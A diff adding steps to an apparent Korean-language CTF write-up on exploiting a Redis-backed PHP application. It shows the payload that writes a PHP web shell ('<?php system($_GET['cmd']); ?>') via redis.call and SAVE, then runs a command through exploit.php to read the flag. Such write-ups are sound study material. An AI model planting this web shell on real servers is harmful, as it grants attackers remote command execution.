@@ -69,4 +69,19 @@ config.php의 코드를 보면 이용자의 입력값을 별다른 검증 없이
         <img width="1154" alt="저장되는 파일 이름 변경" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/ce1f9754-aaec-4396-8829-007e169cad22">
         <img width="1154" alt="변경된 파일 이름 확인" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/a7b4df46-e757-46c5-9249-7d135d1a5047">
 
-2. 
+<br/>
+
+2. / 페이지에서 Command에 ```redis.call()``` 함수를 이용해 셸을 실행하는 PHP 코드를 작성한 후 Submit 버튼을 눌러 저정함
+    <img width="1000" alt="php코드작성" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/58449caa-7c5d-4e4c-aff1-14c7152a95ce">
+    - Command에 입력하는 PHP 코드 내용
+        ```
+        return redis.call("set", "test", "<?php system($_GET['cmd']); ?>");
+        ```
+        + ```redis.call()```는 입력받은 인수들을 이용해 Redis 명령을 실행함 → ```SET test "<?php system($_GET['cmd']); ?>"```가 실행됨
+    - 이때 Command 입력창의 Save를 체크하여 SAVE 명령어가 실행되도록 함
+
+<br/>
+
+3. ```접속경로/exploit.php?cmd=/flag```로 접속하면 플래그가 화면에 출력됨
+    <img width="1154" alt="결과" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/4875a901-4a9a-4f29-b205-eaca494c030b">
+
